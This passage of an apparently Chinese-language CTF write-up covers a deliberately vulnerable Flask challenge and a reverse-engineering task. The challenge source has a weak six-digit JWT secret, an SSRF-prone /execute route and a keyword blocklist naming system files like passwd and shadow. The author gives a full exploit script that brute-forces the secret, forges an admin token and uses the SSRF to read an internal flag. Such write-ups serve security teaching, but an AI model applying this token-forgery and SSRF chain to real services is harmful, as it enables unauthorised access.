</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> failure_count
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> failure_count <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> users<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">==</span>password:
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#39;user&#39;</span>: username, <span style="color:#e6db74">&#39;exp&#39;</span>: int(time<span style="color:#f92672">.</span>time()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">600</span>}, secret_key)
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">&#39;Login success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#39;token&#39;</span>, token)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        failure_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#39;Could not verify!&lt;br&gt;&lt;img src=&#34;/3.png&#34;&gt;&#39;</span>, <span style="color:#ae81ff">401</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">&#39;Logout success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#39;token&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, expires<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/home&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
</span></span><span style="display:flex;"><span>    logged_in <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, secret_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>])
</span></span><span style="display:flex;"><span>        text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">!&#34;</span> <span style="color:#f92672">%</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
</span></span><span style="display:flex;"><span>        logged_in <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        logged_in <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;You have not logged in!&#34;</span>
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;title&gt;Home Page&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;!-- 图标能够正常显示耶! --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {{ text }}&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% i</span><span style="color:#e6db74">f logged_in %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;a href=&#34;/logout&#34;&gt;登出&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% e</span><span style="color:#e6db74">lse %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h2&gt;登录&lt;/h2&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;form action=&#34;/login&#34; method=&#34;post&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                用户名: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                密码: &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;input type=&#34;submit&#34; value=&#34;登录&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% e</span><span style="color:#e6db74">ndif %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% i</span><span style="color:#e6db74">f user==&#34;admin&#34; %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;a href=&#34;/admin&#34;&gt;Go to admin panel&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;img src=&#34;/2.png&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% e</span><span style="color:#e6db74">lse %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;img src=&#34;/1.png&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            {</span><span style="color:#e6db74">% e</span><span style="color:#e6db74">ndif %}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>, text<span style="color:#f92672">=</span>text, logged_in<span style="color:#f92672">=</span>logged_in, user<span style="color:#f92672">=</span>data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> verify_token(token) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> verify_token(token)
</span></span><span style="display:flex;"><span>        resp_text <span style="color:#f92672">=</span> render_template_string(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;title&gt;Admin Panel&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;h1&gt;Admin Panel&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;input type=&#34;input&#34; value={{api_url}} id=&#34;api&#34; readonly&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    function execute() {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        fetch(&#34;{{url}}/execute?api_address=&#34;+document.getElementById(&#34;api&#34;).value,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                      {credentials: &#34;include&#34;}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                      ).then(res =&gt; res.text()).then(data =&gt; {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            document.write(data);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        });
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span>, api_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/api&#34;</span>, url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url)
</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> make_response(resp_text)
</span></span><span style="display:flex;"><span>        resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Access-Control-Allow-Credentials&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;true&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resp
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style="color:#ae81ff">401</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/execute&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute</span>():
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> verify_token(token) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> verify_token(token)
</span></span><span style="display:flex;"><span>    api_address <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;api_address&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> api_address:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;No api address!&#34;</span>, <span style="color:#ae81ff">400</span>)
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(api_address, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;token&#39;</span>: token})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">api</span>():
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> verify_token(token) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> verify_token(token)
</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Server Info: </span><span style="color:#e6db74">{</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;uname -a&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Access-Control-Allow-Credentials&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;true&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&lt;path:file&gt;&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">static_file</span>(file):
</span></span><span style="display:flex;"><span>    print(file)
</span></span><span style="display:flex;"><span>    restricted_keywords <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;proc&#34;</span>, <span style="color:#e6db74">&#34;env&#34;</span>, <span style="color:#e6db74">&#34;passwd&#34;</span>, <span style="color:#e6db74">&#34;shadow&#34;</span>, <span style="color:#e6db74">&#34;hosts&#34;</span>, <span style="color:#e6db74">&#34;sys&#34;</span>, <span style="color:#e6db74">&#34;log&#34;</span>, <span style="color:#e6db74">&#34;etc&#34;</span>, 
</span></span><span style="display:flex;"><span>                           <span style="color:#e6db74">&#34;bin&#34;</span>, <span style="color:#e6db74">&#34;lib&#34;</span>, <span style="color:#e6db74">&#34;tmp&#34;</span>, <span style="color:#e6db74">&#34;var&#34;</span>, <span style="color:#e6db74">&#34;run&#34;</span>, <span style="color:#e6db74">&#34;dev&#34;</span>, <span style="color:#e6db74">&#34;home&#34;</span>, <span style="color:#e6db74">&#34;boot&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> any(keyword <span style="color:#f92672">in</span> file <span style="color:#66d9ef">for</span> keyword <span style="color:#f92672">in</span> restricted_keywords):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;STOP!&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(<span style="color:#e6db74">&#34;./static/&#34;</span> <span style="color:#f92672">+</span> file):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;Not found!&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(<span style="color:#e6db74">&#34;./static/&#34;</span> <span style="color:#f92672">+</span> file)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>,port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
</span></span></code></pre></div><p>简单的审计一下代码</p>
<p>密码的登陆是uuid</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>base_key <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>secret_key <span style="color:#f92672">=</span> get_random_number_string(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>admin_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ _ <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> base_key])
</span></span></code></pre></div><p>同时限制了登录次数,所以不能直接fuzz爆破</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> failure_count <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, secret_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;admin&#39;</span>:
</span></span><span style="display:flex;"><span>            failure_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>伪造需要secret_key，</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>users <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;admin&#39;</span>: admin_pass,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;amiya&#39;</span>: <span style="color:#e6db74">&#34;114514&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>本段代码我们可以知道一个有效账户 <code>amiya</code>，密码 <code>114514</code>，通过发包登录，我们可以获得一个有效的 <code>token</code>，据此能在本地认证签名 <code>secret_key</code> 的有效性,爆破出 <code>secret_key</code>，然后查看登录后的逻辑：</p>
<p>前端请求 <code>/execute</code> 指定 <code>api_address</code>，而 <code>api_address</code> 可控且没有校验，存在 SSRF 漏洞。</p>
<p>利用 <code>/execute</code> 路由的 SSRF 漏洞让服务器自己访问</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://39.106.48.123:19369/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_number_string</span>(number, length):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>number<span style="color:#e6db74">:</span><span style="color:#e6db74">0</span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;login&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;amiya&#34;</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;114514&#34;</span>})
</span></span><span style="display:flex;"><span>    response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;token&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> token:
</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>RequestException:
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000000</span>):
</span></span><span style="display:flex;"><span>    secret_key <span style="color:#f92672">=</span> get_number_string(i, LENGTH)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        decoded <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, secret_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;HS256&#34;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InvalidSignatureError:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>fake_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#39;user&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;exp&#39;</span>: int(time<span style="color:#f92672">.</span>time()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">600</span>}, secret_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    flag_response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;execute?api_address=http://localhost:5001/fl4g&#34;</span>, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;token&#34;</span>: fake_token})
</span></span><span style="display:flex;"><span>    flag_response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>    print(flag_response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>RequestException:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
</span></span></code></pre></div><h2 id="re-2">Re<a hidden class="anchor" aria-hidden="true" href="#re-2">#</a></h2>
<h3 id="pangbai-过家家3">PangBai 过家家（3）<a hidden class="anchor" aria-hidden="true" href="#pangbai-过家家3">#</a></h3>
<p>大概流程参照<a href="https://www.cnblogs.com/demo41/p/18226496">Pyinstaller打包exe的反编译——LitCTF 2024（公开赛道）ezpython！！！！！ - demo41 - 博客园 (cnblogs.com)</a></p>
<p>首先把exe进行解包变成pyc文件，用这个项目，或者有在线网站</p>
<p><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com)</a>，得到同名的pyc，然后再找个网站反编译文件</p>
<p><a href="https://pylingual.io/view_chimera?identifier=f63fac43765afc0144c06a74f7b63067d41bad9a413bc7f0369948c9ea30fd9f">反编译</a>，得到源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Decompiled with PyLingual (https://pylingual.io)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Internal filename: NotNormalExe.py</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bytecode version: 3.12.0rc2 (3531)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Welcome to NewStar~&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Please input the flag:&#39;</span>)
</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> [<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">79</span>]
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NewStar2024&#39;</span>
</span></span><span style="display:flex;"><span>input <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(input) <span style="color:#f92672">!=</span> len(enc):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;Wrong flag, try again!&#39;</span>)
</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(input)):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> enc[i] <span style="color:#f92672">!=</span> ord(input[i]) <span style="color:#f92672">^</span> ord(key[i <span style="color:#f92672">%</span> len(key)]):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Wrong flag, try again!&#39;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
